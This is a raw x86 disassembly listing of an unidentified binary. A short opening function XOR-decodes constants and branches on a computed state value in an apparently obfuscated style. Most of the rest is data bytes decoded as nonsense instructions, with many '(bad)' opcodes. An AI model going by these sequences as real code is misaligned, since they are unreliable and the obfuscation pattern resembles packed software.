  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [eax+0x292f5aed],bl
  407a4f:	aam    0x7c
  407a51:	jl     0x407a2a
  407a53:	jns    0x407ad1
  407a55:	jl     0x4079e3
  407a57:	(bad)  
  407a58:	push   esi
  407a59:	popa   
  407a5a:	lock jns 0x407ad1
  407a5d:	call   0xef0b:0x7efe11f3
  407a64:	sahf   
  407a65:	vmread DWORD PTR [esi-0x59],eax
  407a69:	and    dh,BYTE PTR [esi]
  407a6b:	(bad)  
  407a6c:	sub    edi,edx
  407a6e:	xor    ah,BYTE PTR [edx+0x6f]
  407a71:	(bad)  
  407a72:	enter  0x2734,0x68
  407a76:	aaa    
  407a77:	lock arpl WORD PTR [ecx],cx
  407a7a:	adc    DWORD PTR [ebx],0xffffffbe
  407a7d:	jae    0x407a74
  407a7f:	xchg   edi,eax
  407a80:	push   edx
  407a81:	dec    edx
  407a82:	clc    
  407a83:	ins    DWORD PTR es:[edi],dx
  407a84:	fcmovbe st,st(2)
  407a86:	mov    DWORD PTR es:[edx+0x7f],eax
  407a8a:	cmp    DWORD PTR [eax-0x1],edi
  407a8d:	aas    
  407a8e:	iret   
  407a8f:	loope  0x407a87
  407a91:	leave  
  407a92:	repnz dec eax
  407a94:	mov    ecx,0xceda946
  407a99:	jl     0x407b06
  407a9b:	fld1   
  407a9d:	pop    ecx
  407a9e:	and    eax,0xa82617e8
  407aa3:	cmc    
  407aa4:	lea    ecx,[esi-0x1203b0a8]
  407aaa:	inc    esp
  407aab:	sbb    DWORD PTR [ebp+0x15d03cdd],ebx
  407ab1:	scas   al,BYTE PTR es:[edi]
  407ab2:	jmp    0x9996dcc7
  407ab7:	pop    es
  407ab8:	in     eax,0xc9
  407aba:	sub    ah,dh
  407abc:	jne    0x407b2f
  407abe:	sub    ax,0x9038
  407ac2:	popf   
  407ac3:	xor    DWORD PTR [ebp-0x27],ebx
  407ac6:	(bad)
  407ac9:	popf   
  407aca:	xchg   edx,eax
  407acb:	jno    0x407a52
  407acd:	enter  0xf502,0x40
  407ad1:	push   edi
  407ad2:	dec    edi
  407ad3:	test   DWORD PTR [ecx+0x34],ebp
  407ad6:	add    DWORD PTR [ecx+0x56],ebx
  407ad9:	sbb    al,0xde
  407adb:	mov    ecx,0xcfee97e6
  407ae0:	aaa    
  407ae1:	addr16 (bad) 
  407ae3:	cmp    BYTE PTR [esi+0x5a96a81e],bh
  407ae9:	mov    ebx,DWORD PTR [esi+0x670735fe]
  407aef:	neg    BYTE PTR [esi-0x3371116e]
  407af5:	add    dh,ah
  407af7:	fcom   DWORD PTR [ebp+0x32c5b741]
  407afd:	ss out 0x6d,al
  407b00:	mov    BYTE PTR [edx+0x65],cl
  407b03:	shl    DWORD PTR [edx],cl
  407b05:	cwde   
  407b06:	cli    
  407b07:	mov    ah,0x42
  407b09:	sbb    ecx,DWORD PTR [ecx-0x13]
  407b0c:	mov    ?,WORD PTR [edx+eax*2+0x54]
  407b10:	(bad)
  407b13:	pop    edi
  407b14:	cmp    cl,BYTE PTR [esi-0x1]
  407b17:	mov    edx,0x81aa3645
  407b1c:	sub    al,0xd2
  407b1e:	imul   ecx,DWORD PTR [ecx-0x45885fd3],0x5c
  407b25:	push   edi
  407b26:	jae    0x407aaf
  407b28:	jns    0x407b1c
  407b2a:	cdq    
  407b2b:	pop    ss
  407b2c:	add    eax,0x862f4a6a
  407b31:	sub    al,0x8e
  407b33:	dec    ebx
  407b34:	xchg   DWORD PTR [ecx+0x3c],ebx
  407b37:	mov    ds:0xa57236e5,eax
  407b3c:	add    ebx,esi
  407b3e:	mov    ah,0x6
  407b40:	shl    BYTE PTR ds:0x67c459c2,cl
  407b46:	mov    WORD PTR [ebp-0x15],?
  407b49:	xor    eax,0xef9477e
  407b4e:	mov    ebp,es
  407b50:	jo     0x407b80
  407b52:	jp     0x407b92
  407b54:	jno    0x407b16
  407b56:	ds and eax,ebp
  407b59:	fnstcw WORD PTR [edi+0x48]
  407b5c:	inc    edx
  407b5d:	push   ebp
  407b5e:	(bad)  
  407b5f:	repnz push eax
  407b61:	test   BYTE PTR [edi-0x1f6884a],ah
  407b67:	xchg   esp,eax
  407b68:	add    al,0xad
  407b6a:	icebp  
  407b6b:	push   ss
  407b6c:	lods   eax,DWORD PTR ds:[esi]
  407b6d:	fdivr  DWORD PTR [eax]
  407b6f:	add    al,cl
  407b71:	out    0xd9,al
  407b73:	fnstsw WORD PTR [edi-0x1ca655d7]
  407b79:	repnz and al,0x50
  407b7c:	daa    
  407b7d:	add    al,0x85
  407b7f:	aam    0xf4
  407b81:	push   eax
  407b82:	shr    BYTE PTR [edi+esi*8+0x46],0x1b
  407b87:	scas   eax,DWORD PTR es:[edi]
  407b88:	xchg   BYTE PTR ds:0xe1331c21,cl
  407b8e:	inc    esi
  407b8f:	mov    ds:0x8a42f0b1,eax
  407b94:	stos   BYTE PTR es:[edi],al
  407b95:	lock mov BYTE PTR [edi],ah
  407b98:	fldenv [ebx]
  407b9a:	add    al,0x57
  407b9c:	test   eax,0x8827edf
  407ba1:	push   es
  407ba2:	jbe    0x407b7d
  407ba4:	mov    edx,0xe4d4fc22
  407ba9:	dec    eax
  407baa:	test   DWORD PTR [esi+0x79],ecx
  407bad:	shr    ebp,cl
  407baf:	dec    edi
  407bb0:	es into 
  407bb2:	gs jle 0x407bcf
  407bb5:	or     BYTE PTR ds:[edi+0x77],ah
  407bb9:	adc    al,0x5d
  407bbb:	lea    esp,fs:[eax+0x4cc4ed05]
  407bc2:	adc    al,0x14
  407bc4:	fs cmp eax,0xef6f6f59
  407bca:	add    BYTE PTR [edx-0x460af2d7],dh
  407bd0:	cmp    ecx,DWORD PTR [ecx+0xfb038b]
  407bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bd7:	push   edx
  407bd8:	loope  0x407bbe
  407bda:	dec    edx
  407bdb:	and    BYTE PTR [edi+0x5c6b5e70],ah
  407be1:	push   ebp
  407be2:	lods   al,BYTE PTR ds:[esi]
  407be3:	jmp    0x5e0892
  407be8:	out    0xa4,eax
  407bea:	xchg   DWORD PTR [eax-0x76e25fd8],esp
  407bf0:	jo     0x407c2d
  407bf2:	(bad)  
  407bf3:	loopne 0x407c31
  407bf5:	rcl    DWORD PTR [ebx],cl
  407bf7:	test   al,0x83
  407bf9:	jb     0x407c12
  407bfb:	test   BYTE PTR [ebx-0x459c97e3],ah
  407c01:	aas    
  407c02:	scas   eax,DWORD PTR es:[edi]
  407c03:	jg     0x407b9f
  407c05:	(bad)  
  407c06:	fwait
  407c07:	pop    ds
  407c08:	sub    dl,dh
  407c0a:	dec    eax
  407c0b:	addr16 loope 0x407c30
  407c0e:	push   edi
  407c0f:	stos   BYTE PTR es:[edi],al
  407c10:	and    ebp,edx
  407c12:	test   edi,ebp
  407c14:	retf   0x533e
  407c17:	enter  0x5700,0xa2
  407c1b:	jne    0x407c7f
  407c1d:	dec    ebx
  407c1e:	jmp    0x407bea
  407c20:	les    esp,FWORD PTR ds:0xb1e5f515
  407c26:	outs   dx,BYTE PTR ds:[esi]
  407c27:	push   ss
  407c28:	mov    edx,0xdb893dc8
  407c2d:	sbb    BYTE PTR [ebp-0x2ee926d1],dl
  407c33:	out    dx,eax
  407c34:	push   esp
  407c35:	push   0xffffff81
  407c37:	push   0x6caef50
  407c3c:	or     BYTE PTR [esi+0x25],bl
  407c3f:	rol    bl,1
  407c41:	sub    DWORD PTR [ecx-0x380c9c97],0x71
  407c48:	and    DWORD PTR [ecx+0xf],0x65d8d472
  407c4f:	call   0x717ea0cd
  407c54:	dec    edi
  407c55:	cmp    al,0xdc
  407c57:	outs   dx,BYTE PTR ds:[esi]
  407c58:	mov    ebp,0x99444122
  407c5d:	jae    0x407c63
  407c5f:	aad    0x25
  407c61:	inc    esp
  407c62:	addr16 push esi
  407c64:	mov    DWORD PTR [edi],edi
  407c66:	xor    BYTE PTR [ebp+0x52a3cc14],bl
  407c6c:	lods   eax,DWORD PTR ds:[esi]
  407c6d:	or     al,BYTE PTR [ecx]
  407c6f:	cld    
  407c70:	jecxz  0x407cd8
  407c72:	mov    bh,0x8
  407c74:	xor    al,0x1a
  407c76:	push   esp
  407c77:	mov    eax,0x12516a5d
  407c7c:	and    esp,DWORD PTR [edx]
  407c7e:	push   ecx
  407c7f:	test   eax,0x9ba0752d
  407c84:	arpl   bx,bp
  407c86:	ss (bad) 
  407c88:	push   DWORD PTR [esi+0x58e3e8b]
  407c8e:	sub    edx,edi
  407c90:	aaa    
  407c91:	into   
  407c92:	pusha  
  407c93:	jg     0x407ca5
  407c95:	popf   
  407c96:	mov    esi,0x407ec690
  407c9b:	dec    edi
  407c9c:	jg     0x407c26
  407c9e:	cmp    al,0x85
  407ca0:	in     eax,dx
  407ca1:	xor    BYTE PTR [edi-0x31fa6b0f],dl
  407ca7:	popf   
  407ca8:	mov    esi,0xefeee89b
  407cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cae:	or     ecx,DWORD PTR ds:0x951082c9
  407cb4:	cmp    eax,0x4f0eb525
  407cb9:	inc    eax
  407cba:	jmp    0x407ce3
  407cbc:	cmp    ebx,esi
  407cbe:	into   
  407cbf:	jecxz  0x407ca1
  407cc1:	scas   eax,DWORD PTR es:[edi]
  407cc2:	fnstenv [edi]
  407cc4:	test   cl,bl
  407cc6:	jnp    0x407ca2
  407cc8:	rcr    BYTE PTR [esi+0x11],0x23
  407ccc:	mov    dl,BYTE PTR gs:[ecx-0xc89763b]
  407cd3:	(bad)  
  407cd4:	mov    dl,0x4e
  407cd6:	pop    ebx
  407cd7:	mov    esi,0x6e2357cf
  407cdc:	pop    ecx
  407cdd:	push   ebp
  407cde:	fs pop ebp
  407ce0:	sbb    BYTE PTR ds:0x3499e4c,dl
  407ce6:	das    
  407ce7:	add    DWORD PTR [edi],ecx
  407ce9:	mov    bh,0x9a
  407ceb:	jo     0x407cce
  407ced:	or     bh,BYTE PTR [ebx+0x53472183]
  407cf3:	mov    dh,0xd2
  407cf5:	jbe    0x407d4d
  407cf7:	pop    ebx
  407cf8:	xor    DWORD PTR [edi+0x5a],0xa307778e
  407cff:	add    ch,cl
  407d01:	out    0xc6,al
  407d03:	lahf   
  407d04:	outs   dx,BYTE PTR ds:[esi]
  407d05:	ins    DWORD PTR es:[edi],dx
  407d06:	retf   0xc40f
  407d09:	cmp    eax,0xeeaa16e1
  407d0e:	mov    ah,0xa1
  407d10:	jae    0x407d06
  407d12:	sbb    ch,BYTE PTR [ecx]
  407d14:	ret    
  407d15:	stc    
  407d16:	outs   dx,BYTE PTR ds:[esi]
  407d17:	shl    BYTE PTR [ebx+0x50132f6d],cl
  407d1d:	fwait
  407d1e:	dec    esp
  407d1f:	lods   al,BYTE PTR ds:[esi]
  407d20:	adc    ebp,DWORD PTR [edi+ebx*4-0x46489216]
  407d27:	pop    ss
  407d28:	jae    0x407cac
  407d2a:	sbb    eax,0x8817e9c1
  407d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d30:	push   0x93b52bda
  407d35:	imul   ecx,esi,0xd
  407d38:	push   ds
  407d39:	push   esi
  407d3a:	stos   DWORD PTR es:[edi],eax
  407d3b:	mov    eax,0xc9143882
  407d40:	pushf  
  407d41:	dec    edi
  407d42:	lds    esp,FWORD PTR [edx-0x68]
  407d45:	(bad)  
  407d46:	cs mov al,0x92
  407d49:	inc    ebp
  407d4a:	push   ds
  407d4b:	push   ds
  407d4c:	test   DWORD PTR [ebp-0x125a955c],0x5eafaeeb
  407d56:	loop   0x407cf0
  407d58:	dec    ebp
  407d59:	mov    WORD PTR [ecx+ebx*4+0x68efd2ee],ss
  407d60:	sub    DWORD PTR [ebx-0x1b],0x4662e386
  407d67:	mov    bl,0x2e
  407d69:	ficom  WORD PTR [ebp+0x1a82e88]
  407d6f:	inc    ebp
  407d70:	imul   esi,DWORD PTR [edx],0x4f
  407d73:	outs   dx,BYTE PTR ds:[esi]
  407d74:	sbb    al,0x16
  407d76:	fisttp DWORD PTR [edx]
  407d78:	fiadd  DWORD PTR [eax+0x5d]
  407d7b:	mov    edx,0xc24556aa
  407d80:	iret   
  407d81:	push   eax
  407d82:	les    eax,FWORD PTR [ecx-0x40b27154]
  407d88:	out    0x4c,al
  407d8a:	xchg   ecx,eax
  407d8b:	aam    0xab
  407d8d:	mov    ecx,0x1f8b1e37
  407d92:	push   ss
  407d93:	icebp  
  407d94:	bound  ebx,QWORD PTR [eax+0x30]
  407d97:	cwde   
  407d98:	inc    esp
  407d99:	lods   eax,DWORD PTR ds:[esi]
  407d9a:	sbb    DWORD PTR ds:0xcc3ec631,esi
  407da0:	icebp  
  407da1:	sti    
  407da2:	pop    esp
  407da3:	jecxz  0x407df2
  407da5:	scas   eax,DWORD PTR es:[edi]
  407da6:	mov    bl,0x4d
  407da8:	mov    edx,0xcdac351b
  407dad:	adc    al,0xf2
  407daf:	imul   edx,edx,0xf89ea9e8
  407db5:	mov    DWORD PTR [eax],edx
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     al,ah
  407dd1:	mov    DWORD PTR [ebx+edx*2+0x7c7cd180],ecx
  407dd8:	xlat   BYTE PTR ds:[ebx]
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407d62
  407ddd:	cmp    esp,DWORD PTR [edx-0x4a519adc]
  407de3:	inc    edi
  407de4:	or     eax,0x939845ac
  407de9:	pop    esi
  407dea:	dec    edx
  407deb:	jbe    0x407da7
  407ded:	leave  
  407dee:	(bad)
  407df3:	sbb    ebp,DWORD PTR [ecx]
  407df5:	js     0x407db6
  407df7:	pop    ecx
  407df8:	xor    al,BYTE PTR [eax+0x64]
  407dfb:	hlt    
  407dfc:	push   0xfffffffd
  407dfe:	stos   BYTE PTR es:[edi],al
  407dff:	mov    ebp,0xca05fde3
  407e04:	loop   0x407e40
  407e06:	loope  0x407e45
  407e08:	adc    al,0x16
  407e0a:	add    al,0xd1
  407e0c:	cmp    ebp,DWORD PTR [esi+0x63b49a25]
  407e12:	test   BYTE PTR [ecx+0x30],bh
  407e15:	pop    ss
  407e16:	xchg   ecx,eax
  407e17:	jmp    0xe3482741
  407e1c:	cs call 0xf97:0x35e2a2bc
  407e24:	fld    TBYTE PTR [eax-0x1b]
  407e27:	jno    0x407df5
  407e29:	or     eax,0xe8a13973
  407e2e:	push   ss
  407e2f:	sub    DWORD PTR [eax+eiz*8-0x44],0xffffff80
  407e34:	rcr    DWORD PTR [ebx-0x45],cl
  407e37:	das    
  407e38:	cmp    bh,BYTE PTR [eax+0x49]
  407e3b:	mov    ch,0x3c
  407e3d:	and    al,0xb5
  407e3f:	cs ins BYTE PTR es:[edi],dx
  407e41:	stos   BYTE PTR es:[edi],al
  407e42:	(bad)  
  407e43:	sahf   
  407e44:	mov    edi,0x3dc4ab74
  407e49:	cs sub al,0x99
  407e4c:	jmp    0x407ea1
  407e4e:	xchg   BYTE PTR [eax-0x5d6207c0],ch
  407e54:	sbb    BYTE PTR [esi],bh
  407e56:	fdivr  st,st(7)
  407e58:	in     al,0x32
  407e5a:	mov    ebx,0x36aac74c
  407e5f:	sub    eax,0xa5d39030
  407e64:	adc    eax,0x1e8ee5e
  407e69:	mov    edx,0x290c71e7
  407e6e:	das    
  407e6f:	clc    
  407e70:	mov    dl,0x2b
  407e72:	push   ebp
  407e73:	add    al,0xfc
  407e75:	retf   
  407e76:	mov    ss,esp
  407e78:	popf   
  407e79:	ds clc 
  407e7b:	cmp    DWORD PTR [edi],esi
  407e7d:	jne    0x407e88
  407e7f:	cmp    ebx,edi
  407e81:	retf   
  407e82:	or     dl,al
  407e84:	icebp  
  407e85:	add    eax,0x2675e01
  407e8a:	cmp    esi,DWORD PTR ds:0x73ba4671
  407e90:	ins    BYTE PTR es:[edi],dx
  407e91:	push   eax
  407e92:	aad    0xdb
  407e94:	ds jmp 0xcd8e:0xb47c7340
  407e9c:	sub    eax,DWORD PTR [eax-0x6c]
  407e9f:	cmp    DWORD PTR [eax],ebx
  407ea1:	pop    esi
  407ea2:	pusha  
  407ea3:	cmp    DWORD PTR [ebp-0x3b224205],0x45998368
  407ead:	mov    ah,dl
  407eaf:	or     edi,DWORD PTR [ecx+0x66098b59]
  407eb5:	push   ecx
  407eb6:	push   cs
  407eb7:	push   esp
  407eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb9:	cdq    
  407eba:	and    esi,DWORD PTR [ebx-0x9ce96c3]
  407ec0:	fwait
  407ec1:	pushf  
  407ec2:	loope  0x407ed3
  407ec4:	gs push ebp
  407ec6:	enter  0x4548,0xf4
  407eca:	sbb    eax,0xd9b2c59f
  407ecf:	int3   
  407ed0:	mov    eax,ds:0x74a9432f
  407ed5:	outs   dx,DWORD PTR ds:[esi]
  407ed6:	mov    DWORD PTR ds:0x3d318f90,ebp
  407edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407edd:	pop    eax
  407ede:	push   esp
  407edf:	xchg   ebp,eax
  407ee0:	mov    ecx,0xf9026c10
  407ee5:	xchg   esi,eax
  407ee6:	cld    
  407ee7:	cld    
  407ee8:	in     al,0x53
  407eea:	test   ah,bl
  407eec:	mov    ds,ebx
  407eee:	push   edx
  407eef:	sub    DWORD PTR [edx-0x433d7c1c],0xffffffea
  407ef6:	imul   esi,DWORD PTR [ecx-0x1e723755],0x73
  407efd:	jmp    0x9496234
  407f02:	imul   DWORD PTR [esi]
  407f04:	js     0x407eb8
  407f06:	mov    esi,0xf388f5a2
  407f0b:	test   BYTE PTR [esi],bl
  407f0d:	adc    ebp,ecx
  407f0f:	test   BYTE PTR ds:0x182fd2ab,bh
  407f15:	xchg   ecx,eax
  407f16:	fiadd  DWORD PTR [esp+ebx*4-0x756605ad]
  407f1d:	in     al,dx
  407f1e:	push   ss
  407f1f:	inc    edx
  407f20:	pop    ss
  407f21:	sbb    eax,0x6b6ae522
  407f26:	clc    
  407f27:	into   
  407f28:	les    esi,FWORD PTR [esi-0x44108493]
  407f2e:	repnz pop ss
  407f30:	jno    0x407ecd
  407f32:	(bad)  
  407f33:	and    al,bh
  407f35:	sbb    esi,0xffffff86
  407f38:	xchg   edi,eax
  407f39:	loope  0x407faf
  407f3b:	mov    al,ds:0x2dd8efae
  407f40:	ja     0x407ecc
  407f42:	fadd   QWORD PTR [ecx-0x3e]
  407f45:	sbb    DWORD PTR [ecx+0x46c9f1f3],eax
  407f4b:	fwait
  407f4c:	mov    dl,0x3
  407f4e:	scas   eax,DWORD PTR es:[edi]
  407f4f:	pop    esp
  407f50:	mov    esp,DWORD PTR es:[eax-0x4b2270c3]
  407f57:	ret    0x883d
  407f5a:	mov    ebx,0x6b4667f
  407f5f:	lods   al,BYTE PTR ds:[esi]
  407f60:	cwde   
  407f61:	ror    DWORD PTR [ecx],1
  407f63:	mov    ecx,0xae54ab8b
  407f68:	sbb    BYTE PTR [ebx-0x61f7c050],dh
  407f6e:	rcl    BYTE PTR [ebp-0x29],0xbb
  407f72:	bound  edi,QWORD PTR [ecx-0x52]
  407f75:	clc    
  407f76:	lock test DWORD PTR [eax],ecx
  407f79:	and    dh,BYTE PTR [ebx-0x49]
  407f7c:	mov    es,WORD PTR [ebp-0x7a]
  407f7f:	(bad)  
  407f80:	aam    0x8d
  407f82:	test   al,0x55
  407f84:	rcl    BYTE PTR [ebx-0x41],1
  407f87:	sti    
  407f88:	gs cld 
  407f8a:	sbb    eax,eax
  407f8c:	popf   
  407f8d:	xchg   ecx,eax
  407f8e:	(bad)  
  407f8f:	mov    dh,0x4a
  407f91:	fld    DWORD PTR [esi+0x4736215c]
  407f97:	mov    ebp,0xb7aefae4
  407f9c:	dec    esi
  407f9d:	pop    ecx
  407f9e:	mov    esi,0x4ad665f7
  407fa3:	dec    edi
  407fa4:	in     eax,dx
  407fa5:	icebp  
  407fa6:	icebp  
  407fa7:	icebp  
  407fa8:	out    0x51,al
  407faa:	mov    ah,0xd4
  407fac:	mov    al,0x68
  407fae:	adc    eax,DWORD PTR [ecx+0x6545e29f]
  407fb4:	dec    ecx
  407fb5:	test   eax,0x9cb92636
  407fba:	add    BYTE PTR [edx+0x3bc88341],cl
  407fc0:	imul   ebx,DWORD PTR ds:0x3adb9966,0xfffffffc
  407fc7:	mov    esi,DWORD PTR [edi]
  407fc9:	xor    esi,DWORD PTR [ebx-0x6ff436f7]
  407fcf:	push   es
  407fd0:	repz in al,dx
  407fd2:	fwait
  407fd3:	jnp    0x408028
  407fd5:	fst    QWORD PTR [eax]
  407fd7:	fcom   DWORD PTR [ecx]
  407fd9:	mov    WORD PTR [ebx+0x61],ss
  407fdc:	ret    
  407fdd:	cmp    al,0x36
  407fdf:	stos   DWORD PTR es:[edi],eax
  407fe0:	inc    BYTE PTR [esi+0x21]
  407fe3:	loop   0x407fd9
  407fe5:	(bad)  
  407fe6:	xor    DWORD PTR [edx+0x469b753e],eax
  407fec:	loope  0x40800f
  407fee:	adc    dh,dl
  407ff0:	xor    al,0xe7
  407ff2:	pop    esp
  407ff3:	pshufw mm3,QWORD PTR [edx],0x8d
  407ff7:	fcmovnbe st,st(0)
  407ff9:	(bad)  
  407ffa:	fucomp st(7)
  407ffc:	lock stc 
  407ffe:	mov    dl,0x59
  408000:	ins    DWORD PTR es:[edi],dx
  408001:	out    dx,eax
  408002:	add    eax,0xb6d01c4c
  408007:	cmp    eax,0x1662c341
  40800c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40800d:	jno    0x408033
  40800f:	adc    esi,DWORD PTR [ebx]
  408011:	and    BYTE PTR [ecx+edi*1-0x7f3fc2d5],ch
  408018:	mov    ds:0x46ee493d,al
  40801d:	and    ebp,DWORD PTR [ecx+edi*2+0xc]
  408021:	scas   eax,DWORD PTR es:[edi]
  408022:	adc    eax,0x9c66cde4
  408027:	rcl    DWORD PTR [edi+0x56],cl
  40802a:	cli    
  40802b:	rol    dh,0x52
  40802e:	sbb    DWORD PTR [esi],0x87232fc2
  408034:	xchg   esi,eax
  408035:	inc    esp
  408036:	push   eax
  408037:	jnp    0x407fe2
  408039:	mov    al,ds:0x5bb618b1
  40803e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40803f:	int3   
  408040:	sub    DWORD PTR [edx-0x4b],esp
  408043:	pusha  
  408044:	and    al,0x8f
  408046:	push   0xffffff96
  408048:	fimul  DWORD PTR [edx]
  40804a:	mov    ebx,0x843e880b
  40804f:	pop    esp
  408050:	sbb    esi,DWORD PTR [ebx+0x58cccf58]
  408056:	push   edi
  408057:	std    
  408058:	ds loope 0x40808a
  40805b:	lock xor eax,0x6395dd45
  408061:	loope  0x408019
  408063:	and    BYTE PTR [eax-0x54],dh
  408066:	cmc    
  408067:	cwde   
  408068:	mov    BYTE PTR [ecx],bh
  40806a:	fcomp  QWORD PTR [edi-0x7defb460]
  408070:	mov    ecx,0x6b81246b
  408075:	mov    ecx,0xd74bc4e4
  40807a:	sub    DWORD PTR [ebx],0x84f40bb6
  408080:	ret    0x3682
  408083:	sbb    BYTE PTR [eax-0x352b8c8b],0xb3
  40808a:	imul   eax
  40808c:	mov    ebp,0xe4ea74dc
  408091:	mov    dl,0x80
  408093:	pop    ds
  408094:	cli    
  408095:	or     bh,BYTE PTR [ebx-0x1f]
  408098:	add    edx,DWORD PTR [eax+0x1b]
  40809b:	mov    ecx,esp
  40809d:	icebp  
  40809e:	xchg   BYTE PTR [esi],ah
  4080a0:	test   ebp,ecx
  4080a2:	scas   eax,DWORD PTR es:[edi]
  4080a3:	leave  
  4080a4:	sbb    esi,0xffbb0ddb
  4080aa:	outs   dx,DWORD PTR ds:[esi]
  4080ab:	sub    al,0xf
  4080ad:	xchg   ebp,eax
  4080ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080af:	push   cs
  4080b0:	or     al,0xc7
  4080b2:	rcr    DWORD PTR [eax+0x28],1
  4080b5:	out    dx,eax
  4080b6:	and    eax,DWORD PTR [ecx-0x7e]
  4080b9:	sub    ebx,esi
  4080bb:	push   esi
  4080bc:	inc    eax
  4080bd:	bound  ebp,QWORD PTR [edi+edi*8+0x685dc266]
  4080c4:	repnz mov al,ds:0x61f00755
  4080ca:	dec    esp
  4080cb:	adc    edi,DWORD PTR [edi-0x54]
  4080ce:	nop
  4080cf:	push   edi
  4080d0:	test   BYTE PTR [eax+0x1c006403],dl
  4080d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d7:	outs   dx,BYTE PTR ds:[esi]
  4080d8:	inc    ebx
  4080d9:	pop    ss
  4080da:	sub    eax,0x6f99a203
  4080df:	popa   
  4080e0:	lds    edi,FWORD PTR [eax]
  4080e2:	std    
  4080e3:	dec    edx
  4080e4:	inc    ecx
  4080e5:	xchg   ebp,eax
  4080e6:	xchg   edi,eax
  4080e7:	fs jb  0x4080e0
  4080ea:	cdq    
  4080eb:	xor    DWORD PTR [ecx-0x15482951],ebx
  4080f1:	aad    0x73
  4080f3:	fsub   QWORD PTR [ecx]
  4080f5:	pop    eax
  4080f6:	adc    BYTE PTR [edx],al
  4080f8:	pop    ebx
  4080f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080fa:	inc    edx
  4080fb:	add    edi,0x4b
  4080fe:	das    
  4080ff:	inc    esp
  408100:	repz mov ds:0xf80e1dd9,al
  408106:	push   0xe5b70910
  40810b:	ins    DWORD PTR es:[edi],dx
  40810c:	cmc    
  40810d:	dec    ebp
  40810e:	push   edi
  40810f:	jmp    0x40812c
  408111:	pop    ebp
  408112:	add    BYTE PTR [edi+0x15],dh
  408115:	test   BYTE PTR ds:0x775c625a,dh
  40811b:	js     0x40811f
  40811d:	enter  0xa6ac,0xf
  408121:	xchg   ebx,eax
  408122:	fldcw  WORD PTR [ebx]
  408124:	mov    al,0xa2
  408126:	mov    dh,0x6c
  408128:	push   ebp
  408129:	cmp    DWORD PTR [edx-0x2a],ebp
  40812c:	int3   
  40812d:	mul    BYTE PTR [ebx-0x8]
  408130:	pop    esi
  408131:	xchg   esp,eax
  408132:	push   edx
  408133:	sub    ebx,esp
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    ebp,DWORD PTR [ebx+0x5bd78566]
  40815a:	sar    BYTE PTR [esp+edi*2-0x29],cl
  40815e:	jns    0x4081dc
  408160:	jl     0x40810d
  408162:	pop    ebp
  408163:	or     DWORD PTR [edi+0x76082e4d],esi
  408169:	jecxz  0x40818d
  40816b:	test   BYTE PTR [edx-0x7abe7412],ah
  408171:	out    dx,eax
  408172:	cs pop ecx
  408174:	pop    eax
  408175:	push   ebp
  408176:	lods   al,BYTE PTR ds:[esi]
  408177:	out    0x5c,al
  408179:	jmp    0x19a8:0x5685d3fd
  408180:	xor    esi,ecx
  408182:	mov    eax,ds:0x88ec1c4d
  408187:	cmc    
  408188:	dec    esp
  408189:	in     eax,dx
  40818a:	(bad)  
  40818b:	outs   dx,DWORD PTR ds:[esi]
  40818c:	sub    edi,DWORD PTR [eiz*4-0x3d1513ca]
  408193:	jnp    0x4081bc
  408195:	ins    BYTE PTR es:[edi],dx
  408196:	mov    DWORD PTR [eax],ebp
  408198:	icebp  
  408199:	jo     0x40817c
  40819b:	scas   eax,DWORD PTR es:[edi]
  40819c:	repnz pop esi
  40819e:	xchg   ebx,eax
  40819f:	mov    WORD PTR [ecx-0xc],es
  4081a2:	cli    
  4081a3:	mov    ebp,DWORD PTR [ebx+0x5f]
  4081a6:	xchg   dh,cl
  4081a8:	adc    DWORD PTR [esi],edi
  4081aa:	pop    ecx
  4081ab:	and    ecx,DWORD PTR [eax+0x6364923]
  4081b1:	jl     0x40819d
  4081b3:	adc    DWORD PTR [ebx-0x13189c10],esp
  4081b9:	jbe    0x408149
  4081bb:	and    eax,0x239d6f6b
  4081c0:	push   cs
  4081c1:	fistp  WORD PTR [ebx]
  4081c3:	fild   DWORD PTR [ebp-0x7a546efb]
  4081c9:	icebp  
  4081ca:	xchg   edx,eax
  4081cb:	push   ecx
  4081cc:	dec    edi
  4081cd:	pushf  
  4081ce:	daa    
  4081cf:	cmp    ecx,esi
  4081d1:	sub    ecx,ecx
  4081d3:	hlt    
  4081d4:	mov    ebx,0xca78cd6c
  4081d9:	popa   
